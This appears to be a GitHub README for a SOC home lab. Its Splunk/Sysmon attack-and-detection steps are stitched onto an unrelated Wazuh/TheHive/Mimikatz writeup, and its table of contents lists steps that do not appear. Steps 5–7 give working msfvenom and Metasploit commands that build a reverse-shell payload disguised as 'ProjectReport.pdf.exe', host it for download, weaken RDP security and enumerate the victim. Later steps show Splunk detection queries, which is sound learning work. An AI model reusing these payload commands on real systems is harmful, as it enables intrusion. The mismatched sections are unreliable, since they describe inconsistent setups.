# ğŸ‘¨â€ğŸ’»SOC Home Lab: Using Splunk & SysmonğŸš€  

## Table of Contents 
1. [Introduction](#introduction)
2. [Workflow Overview](#-workflow-overview)
3. [Prerequisites](#-prerequisites)
4. [Network Topology](#-network-topology)
5. [Step 1: Environment Setup](#ï¸-step-1-environment-setup)
6. [Step 2: Network Configuration](#-step-2--network-configuration)
7. [Step 3: Initial Network Scanning](#-step-3--initial-network-scanning-)
8. [Step 4: Scanning & Attempted SMB Exploitation](#step-4-scanning-attempted-smb-exploitation)
9. [Step 5: Creating an RDP Vulnerability](#-step-5-creating-an-rdp-vulnerability-)
10. [Step 6: Payload Creation & Listener Setup](#-step-6--payload-delivery-&-exploitation-attempt)
11. [Step 7: Payload Delivery & Reverse Shell](#ï¸-step-7--payload-delivery-&-reverse-shell-gained)
12. [Step 8: Splunk Analysis of Malware Execution](#-step-8-splunk-analysis-of-malware-execution-)
13. [Step 9: Created a Dashboard for Better Understanding](#-step-9-created-a-dashboard-for-better-understanding-)
13. [Step 10: Correlating Reverse Shell Activity with Splunk Logs](#-step-9-correlating-reverse-shell-activity-with-splunk-logs-)
14. [Next Steps & Future Enhancements](#-next-steps--future-enhancements)
15. [Conclusion](#-conclusion)
16. [Letâ€™s Connect](#-lets-connect)


---  
## ğŸ“ŒIntroduction
ğŸ”’ Introduction
Welcome to the SOC Automation Project! ğŸš€

In todayâ€™s world, cyber threats are everywhere â€“ from phishing emails to credential dumping attacks using tools like Mimikatz. Security Operations Centers (SOCs) need to act fast to detect, analyze, and respond to incidents in real time.

This project demonstrates how automation can make SOC operations faster and more efficient.

Weâ€™ve built a mini SOC homelab with:
-> Windows 10 VM as the endpoint where we generate telemetry
-> Wazuh Manager to detect suspicious activity
-> Shuffle for automation and enrichment using VirusTotal API
-> TheHive for case management and investigation

Key Features:
ğŸ” Detect suspicious activity (Mimikatz execution)
ğŸ“¤ Forward alerts from Wazuh to Shuffle
ğŸ¤– Enrich alerts with VirusTotal threat intelligence
ğŸ“§ Notify SOC analysts via email
ğŸ“‚ Create cases in TheHive for investigation

This end-to-end automation flow helps SOC teams respond faster, reduce manual effort, and focus on what matters most â€“ stopping attacks.





ğŸŒ Network Setup

SOC Automation lab uses three virtual machines, and because the RAM requirements were quite high, we distributed them across two laptops while keeping them in the same network.

ğŸ’» Laptop 1
Ubuntu Server 1 (Wazuh Manager):
-> Collects logs from Windows 10 workstation
-> Detects suspicious activity
-> Sends alerts to Shuffle

ğŸ’» Laptop 2
-> Windows 10 Workstation: Generates telemetry by running Mimikatz and sends logs via Wazuh Agent
-> Ubuntu Server 2 (TheHive): Receives enriched alerts and creates cases for SOC analysts
-> Shuffle (SOAR): Automates enrichment with VirusTotal, pushes alerts to TheHive, and sends email notifications

All virtual machines were connected using a bridged network, ensuring seamless communication between laptops as if they were on the same physical network.

ğŸ–¼ï¸ [Insert Simple Network Topology Diagram â€“ Laptop 1 + Laptop 2 + VMs + Bridge Network + Arrows Showing Communication]


---  


ğŸ”„ Workflow Overview
The workflow of SOC Automation Project shows how an attack is detected, enriched, and escalated automatically.

1.Attack Simulation ğŸ–¥ï¸
-> Mimikatz is executed on the Windows 10 Workstation to simulate credential dumping.

2.Detection ğŸ”
-> Wazuh Agent on Windows forwards logs to Wazuh Manager (Laptop 1).
-> Wazuh detects suspicious activity and generates an alert.

3.Automation & Enrichment ğŸ¤–
-> The alert is sent to Shuffle (Laptop 2).
-> Shuffle enriches the alert by checking file hashes with VirusTotal.

4.Case Creation ğŸ“‚
-> The enriched alert is forwarded to TheHive (Laptop 2), where a case is created for SOC investigation.

5.Notification ğŸ“§
-> Shuffle sends an email notification to the SOC analyst with a summary of the incident.

ğŸ–¼ï¸ [Insert Workflow Flowchart â€“ From Attack Simulation to Email Notification]

---  







ğŸŒŸ Key Highlights
SOC Automation Project stands out because of the following features:

-> End-to-End SOC Workflow: Covers detection, enrichment, case creation, and analyst notification seamlessly.
-> Distributed Setup: Uses two laptops with VMs connected via bridged network to handle heavy RAM requirements efficiently.
-> Realistic Attack Simulation: Uses Mimikatz to simulate credential dumping(T1003), replicating real-world attack scenarios.
-> Automation with SOAR: Automatically enriches alerts using VirusTotal and creates cases in TheHive.
-> Immediate Notifications: Sends emails to SOC analysts for faster response.
-> Hands-On SOC Experience: Closely mimics a real SOC environment, making it perfect for learning and practice.

ğŸ–¼ï¸ [Insert Screenshot of Your Entire Lab Setup â€“ Virtual Machines Running on Both Laptops]

---  









## ğŸ”§ Prerequisites 

| Requirement               | Description                                                                                    |
| ------------------------- | ---------------------------------------------------------------------------------------------- |
| **Hypervisor**            | VMware Workstation / VirtualBox (for creating and managing virtual machines)                   |
| **Laptop 1**              | Hosts **Ubuntu Server 1 (Wazuh Manager)** â€“ at least 4 GB RAM, 2 CPU cores                     |
| **Laptop 2**              | Hosts **Windows 10 VM**, **Ubuntu Server 2 (TheHive)**, and **Shuffle** â€“ at least 8 GB RAM    |
| **Operating System ISOs** | Windows 10 ISO & Ubuntu Server ISO                                                             |
| **Tools & Services**      | Wazuh Manager & Agent, Shuffle (Cloud or Local), TheHive, Mimikatz, VirusTotal API Key         |
| **Network Setup**         | Bridged Network (so that both laptops & all VMs communicate as if on the same LAN)             |
| **Internet Connection**   | Required initially for downloading updates, Wazuh, TheHive, and registering VirusTotal API key |
| **Storage**               | Sufficient disk space to run 3 VMs and store log data                                          |


ğŸ–¼ï¸ [Insert Screenshot of VM Settings (RAM, CPU, Network set to Bridged) for Each VM]


---  



ğŸŒ Network Topology

The lab uses two laptops connected through a bridged network, allowing all systems to communicate as if they are on the same LAN.
-> Laptop 1: Hosts Ubuntu Server 1 (Wazuh Manager) â€“ collects logs and forwards alerts.
=> Laptop 2: Hosts Windows 10 Workstation, Ubuntu Server 2 (TheHive), and Shuffle â€“ generates telemetry, enriches alerts, and creates cases.

ğŸ–¼ï¸ [Insert Simple Network Diagram â€“ Laptop 1 & Laptop 2 with their VMs, connected via Bridged Network, arrows showing data flow]


---  

ğŸ› ï¸ Step 1: Environment Setup
To start the project, I set up the virtual environment across two laptops:

-> Installed VMware Workstation (VirtualBox can also be used).
-> Created three VMs: Windows 10 Workstation, Ubuntu Server 1 (Wazuh Manager), and Ubuntu Server 2 (TheHive).
-> Allocated resources: Windows 10 â†’ 5â€“6 GB RAM, Wazuh â†’ 4 GB RAM, TheHive â†’ 6â€“8 GB RAM.
-> Distributed load across two laptops (Laptop 1 hosted Wazuh Manager, Laptop 2 hosted Windows 10, TheHive, and Shuffle).
-> Installed operating systems and set Bridged Network mode so all machines could communicate.

ğŸ–¼ï¸ [Screenshot of All VMs in VMware/VirtualBox With Resource Allocation and Network Mode Visible]

---  

ğŸŒ Step 2: Network Configuration
After setting up the environment, I configured the network for all virtual machines to ensure proper communication:

-> Ubuntu Server 1 (Wazuh Manager): 10.53.159.19
-> Ubuntu Server 2 (TheHive + Shuffle): 10.53.159.152
-> Windows 10 Workstation: 10.53.159.106

All machines were set to Bridged Network Mode so they could communicate with each other and with the host systems seamlessly.

ğŸ–¼ï¸ [Screenshot of VM Network Settings & IP Configurations (ip addr/ipconfig output) for Each VM]


---  


ğŸ› ï¸ Step 3: Installation

For this project, the following tools were installed:
-> Sysmon on the Windows 10 VM (for detailed telemetry)
-> Wazuh SIEM on Ubuntu Server (for centralized log collection & monitoring)
-> TheHive on Ubuntu Server (for alert management & case handling)

ğŸ“º Reference Guide:
  ğŸ”— Click Here for Installation Guide / Video

This guide/video includes:
-> Sysmon installation steps
-> Wazuh manager, dashboard installation
-> TheHive installation and service setup

ğŸ–¼ï¸ Image Suggestion:

ğŸ–¼ï¸ [Single Collage Screenshot of Sysmon CMD Output + Wazuh Dashboard + TheHive Login Page]
(This single collage image will visually represent that all three tools were successfully installed.)

---  




ğŸ§© Step 4: TheHive Configuration

In this step, TheHive was fully configured by modifying its dependencies (Cassandra, Elasticsearch) and its own configuration file.
Below are the detailed commands and configuration changes used during the setup.
 
ğŸ› ï¸ 4.1 Cassandra Configuration

    sudo su
    nano /etc/cassandra/cassandra.yml
ğŸ”§ Changes made:
-> cluster_name: Changed to SOC Project
-> listen_address: Kept as localhost
-> rpc_address: Kept as localhost
-> seed_provider: Ensured value is localhost

Then restart Cassandra to apply changes:

    systemctl stop cassandra.service
    rm -rf /var/lib/cassandra/*
    systemctl start cassandra.service
    systemctl status cassandra.service
âœ… Expected Result: Cassandra service should be in active (running) state.

ğŸ–¼ï¸ Image Suggestion:
ğŸ–¼ï¸ [Screenshot of Cassandra config file (showing cluster_name) + terminal showing Cassandra service running]


ğŸ“¡ 4.2 Elasticsearch Configuration
Edit the Elasticsearch configuration:

    nano /etc/elasticsearch/elasticsearch.yml
ğŸ”§ Changes made:
-> cluster.name: Changed to SOC Project
-> network.host: Uncommented and set to localhost
-> http.port: Uncommented and kept default (9200)
-> cluster.initial_master_nodes: Removed node2, kept only node1

Start and enable Elasticsearch:

    systemctl start elasticsearch
    systemctl enable elasticsearch
    systemctl status elasticsearch
âœ… Expected Result: Elasticsearch should be active (running).

ğŸ–¼ï¸ Image Suggestion:
ğŸ–¼ï¸ [Screenshot of elasticsearch.yml + terminal showing Elasticsearch running]


ğŸ“‚ 4.3 TheHive Directory Permissions
Check directory ownership:

    ls -la /opt/thp
If access is restricted to root, grant permissions to TheHive user:
    chown -R thehive:thehive /opt/thp
    
    ls -la /opt/thp
âœ… Expected Result: Ownership should now belong to thehive:thehive.

ğŸ–¼ï¸ Image Suggestion:
ğŸ–¼ï¸ [Screenshot of directory permissions before and after chown]


âš™ï¸ 4.4 TheHive Application Configuration
Open TheHive configuration file:

    nano /etc/thehive/application.conf
ğŸ”§ Changes made:
-> Ensured hostname is set to localhost

Then start, enable, and check TheHive:

    systemctl start thehive
    systemctl enable thehive
    systemctl status thehive
âœ… Expected Result: TheHive should now be active (running).

Also re-check Cassandra & Elasticsearch status to ensure everything is running:

    systemctl status cassandra.service
    systemctl status elasticsearch.service


ğŸŒ 4.5 Access TheHive UI
Open a browser and navigate to:

    http://localhost:9000
Login with default credentials:

    Username: admin@admin.local
    Password: secret

ğŸ–¼ï¸ Image Suggestion:
ğŸ–¼ï¸ [Screenshot of TheHive login page after first successful run]


ğŸ§  4.6 JVM Options Update
Edit JVM options to adjust memory allocation:

    nano /etc/elasticsearch/jvm.options.d/jvm.options
    -Dlog4j2.formatMsgNoLookups=true
    -Xms2g
    -Xmx2g
âœ… At this stage, TheHive, Cassandra, and Elasticsearch should all be running and accessible, completing the configuration process.



















---  

## ğŸ”„ Step 5: Creating an RDP Vulnerability ğŸ’»ğŸ”“  
Since SMB was a dead end, I decided to create my own vulnerability by enabling Remote Desktop Protocol (RDP, Port 3389) and intentionally misconfiguring it.  

ğŸ›  Steps Taken:  
  Enabled Remote Desktop from the system settings.  
  Nmap scan still showed RDP as closed ğŸš«.  
  ğŸ— Registry Tweak:  
    Opened regedit â†’ navigated to:  

    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server 

  Changed fDenyTSConnections value to 0 âœ… (enabled RDP directly from registry, bypassing GUI).  

ğŸ”„ Service Management:  
  Located TermService (Remote Desktop Services).  
  Stopped â†’ Started â†’ Restarted multiple times to ensure activation.  
  âš™ Group Policy Configuration (gpedit.msc):  
      Enabled Allow users to connect remotely under:  

    Computer Configuration â†’ Administrative Templates â†’ Windows Components â†’ Remote Desktop Services â†’ Remote Desktop Session Host â†’ Connections  

  Ensured Network Level Authentication was disabled to reduce restrictions.  

ğŸ“Š Final Check:  
    Ran Nmap again â†’ âœ… Port 3389 OPEN ğŸ‰  
    Ready for RDP exploitation in the next step!  
 
<p align="center">
  <img src="https://github.com/user-attachments/assets/9c3f884c-812c-4c11-9659-1e4f9a9926ed" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/d57030d2-f85d-49b7-a4a0-fbea9f53cac1" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/697bc3cc-0083-41f9-9a5e-e5334e51d28d" alt="VMware Settings" width="250" height="199"/>
</p>

---  


## ğŸš€ Step 6: ğŸ¯ Payload Delivery & Exploitation Attempt
  With RDP (3389) now open ğŸ”“, I moved on to creating and delivering a malicious payload for exploitation.  
  ğŸ›  Payload Creation (MSFvenom)  

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  

ğŸ’¡ Payload: Windows Meterpreter Reverse TCP  
ğŸ“ LHOST: Attacker machine IP  
ğŸ“ LPORT: Listener port for reverse shell  

ğŸ“¡ Setting Up the Listener (Metasploit)  

    msfconsole  
    use exploit/multi/handler  
    set PAYLOAD windows/meterpreter/reverse_tcp  
    set LHOST 192.168.56.3  
    set LPORT 4444  
    exploit  
ğŸ¯ Waiting for the target to execute the payload...  

ğŸŒ Hosting Payload with Python  
To easily transfer the file to the target, I started a Python HTTP server:  

    python3 -m http.server 9999  

ğŸ“‚ Payload hosted at:  

    http://192.168.56.3:9999/ProjectReport.pdf.exe  
ğŸ“¸ Result:  
    Payload successfully hosted & accessible âœ…  
R    eady for delivery to target ğŸ¯ (execution attempt covered in the next step)   

<p align="center">
  <img src="https://github.com/user-attachments/assets/3e75489f-aa7b-4aa8-abca-54ea410ca2d7" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/b384ec69-3a8b-4c68-9cf5-a01ae3a25b9f" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/2d1547f3-8caa-4233-88ec-084f942687f1" alt="VMware Settings" width="250" height="199"/>
</p>

---  

## ğŸ–¥ï¸ Step 7: ğŸ¯ Payload Delivery & Reverse Shell Gained
  ğŸ’» On Target (Windows 10):  
    1ï¸âƒ£ Opened browser â†’ http://192.168.56.3:9999 ğŸŒ  
    2ï¸âƒ£ Downloaded projectreport.pdf ğŸ“„ (actually projectreport.pdf.exe ğŸ â€” .exe hidden)  
    3ï¸âƒ£ âš ï¸ Chrome Warning: â€œFile contains malwareâ€ â€” Ignored & kept file  
    4ï¸âƒ£ âš ï¸ Windows Defender Alert: â€œFile may be harmfulâ€ â€” Chose to run anyway ğŸ›‘  

  ğŸ’¥ Execution & Shell Access  
  Upon execution, reverse TCP connection established ğŸ”—  
  Meterpreter session opened on Kali ğŸ‰  

  ğŸ” Post-Exploitation Actions  
  Inside Meterpreter:  

      ls  
      shell  
      ipconfig  
      ipconfig /all  
      net localgroup  
      net user  

  ğŸ“Œ Gathered network info, checked user accounts, and enumerated privileges ğŸ‘€  

<p align="center">
  <img src="https://github.com/user-attachments/assets/ca0e12ba-a017-4a4f-9d0b-b420e156b3ca" alt="LAN Segment & IP settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/9a5db2c0-4e8e-431e-9fb3-7a66d3c37968" alt="VMware Settings" width="250" height="199"/>
  <img src="https://github.com/user-attachments/assets/0eaa2f31-45c5-4fe3-afab-6fe42176bf5a" alt="VMware Settings" width="250" height="199"/>
</p>

---  

## ğŸ“Š Step 8: Splunk Analysis of Malware Execution ğŸ•µï¸â€â™‚ï¸
  ğŸ’¡ Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.  
  ğŸ› ï¸ Actions Performed  
  1ï¸âƒ£ Opened Splunk â†’ Search & Reporting App ğŸ“ˆ  
  2ï¸âƒ£ Ran initial search:  

      index=endpoint  
  ğŸ” (endpoint was the index created earlier to store endpoint logs â€” including Sysmon data)  
  3ï¸âƒ£ Located multiple logs for system activities.  
  4ï¸âƒ£ Focused search to find malware traces:  
<p align="center">
  <img src="https://github.com/user-attachments/assets/03c42cf9-6fd0-40eb-a969-849e7c6e6a43" alt="LAN Segment & IP settings" width="350" height="250"/>
</p>

    index=endpoint "projectreport.pdf.exe"  
  ğŸ“Œ Found several logs related to the file execution.  
  5ï¸âƒ£ Opened a specific log â†’ copied Process GUID ğŸ†”  
  6ï¸âƒ£ Queried again with the GUID:  
  
      index=endpoint "<Process_GUID>"  
  ğŸ“Š Retrieved detailed logs of the malware process lifecycle.  
  7ï¸âƒ£ Refined output with table formatting for clarity:  

    index=endpoint "<Process_GUID>"  | table _time, parent_process, image, command_line  

  ğŸ–¥ï¸ Columns included:  
    _time â±ï¸ â€” Timestamp of event  
    parent_process ğŸ—ï¸ â€” Process that spawned this activity  
    image ğŸ–¼ï¸ â€” Executable file path  
    command_line ğŸ’» â€” Full execution command  

<p align="center">
  <img src="https://github.com/user-attachments/assets/69f2784d-7fe3-4a02-aacd-1a3a98ba3655" alt="LAN Segment & IP settings" width="350" height="250"/>
</p>

ğŸ“Œ Result :   
    âœ… Successfully correlated malware file execution with process hierarchy and timeline.  
    âœ… Identified parent process, child process, full path, and execution command for forensic reporting.  

---  

## ğŸ› ï¸ Step 9: Created a Dashboard for Better Understanding
Designed and implemented a comprehensive Splunk dashboard to visualize key security metrics and events. This dashboard includes charts for top source IPs, destination ports, user logons, process executions, suspicious parent-child process relationships, reverse shell indicators, registry key changes, and detailed endpoint logs. It helps in monitoring and quickly identifying potential security incidents during the SOC lab exercises.

<img width="1904" height="500" alt="Dashboard_graphs" src="https://github.com/user-attachments/assets/555803d1-8449-4495-9118-12fb5ab0ae54" />


---  

## ğŸ” Step 10: Correlating Reverse Shell Activity with Splunk Logs ğŸ–¥ï¸ğŸ’£
ğŸ’¡ Objective: Map the attackerâ€™s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.  

ğŸ› ï¸ Actions Performed  
1ï¸âƒ£ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.  
2ï¸âƒ£ We already had the Process GUID for the malware execution from Step 8.  
This GUID was used as the pivot point to find related activity.  
3ï¸âƒ£ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  

    index=endpoint "<Process_GUID>" OR parent_process="<Malware_Process_Path>"  
ğŸ“Œ This helped reveal not only the malware process but also child processes triggered by it.  

4ï¸âƒ£ Looked specifically for commands that matched the attackerâ€™s actions:  
ipconfig, net user, net localgroup ğŸ§¾  
These would appear in logs as part of cmd.exe or powershell.exe executions.  
5ï¸âƒ£ Refined query for command-line activities:  

    index=endpoint ("ipconfig" OR "net user" OR "net localgroup") | table _time, parent_process, image, command_line  

ğŸ’¡ This showed:  
Timestamps matching when commands were run in Meterpreter shell.  
Parent process as cmd.exe launched by the malware.  
6ï¸âƒ£ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation âœ….  

ğŸ“Œ Result  
âœ… Successfully confirmed that the attackerâ€™s shell commands directly originated from the malware execution process.  
âœ… Created a full forensic chain:  
File Download â†’ Execution â†’ Reverse Shell â†’ Commands â†’ Detection in Splunk ğŸ”„  

---  

## ğŸš€ Next Steps & Future Enhancements  
ğŸ” Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis â€” fully customized for your environment.  
ğŸ›¡ï¸ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.  
ğŸ Use Python automation scripts to streamline the attack workflow.  
ğŸ“Ÿ Build a more advanced SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected â€” allowing analysts to respond instantly.  

---  

## ğŸ Conclusion  
Through this project, we were able to:  
ğŸ—ï¸ Build a fully functional cybersecurity home lab  
ğŸ’£ Simulate & analyze malware-based attacks  
ğŸ“Š Leverage Splunk for effective threat detection and incident investigation  
âš ï¸ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.  

---  

## ğŸ“Œ Letâ€™s Connect  
ğŸ’¼ [LinkedIn](https://www.linkedin.com/in/pranavkale1124/)  
ğŸ–¥ï¸ [GitHub](https://github.com/Pranav-Kale)  
